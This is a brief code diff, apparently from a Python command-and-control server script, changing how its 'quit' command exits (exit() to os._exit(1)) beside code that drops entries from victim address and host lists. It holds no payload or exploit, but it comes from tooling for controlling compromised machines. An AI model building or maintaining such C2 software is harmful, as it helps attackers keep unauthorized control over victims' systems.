@@ -91,7 +91,7 @@ def C2():
                 victim_address.remove(victim_address[index])
                 victim_host.remove(victim_host[index])    
             elif CMD == "quit":
-                exit()
+                os._exit(1)
                 
             elif CMD == "help":
                 help()
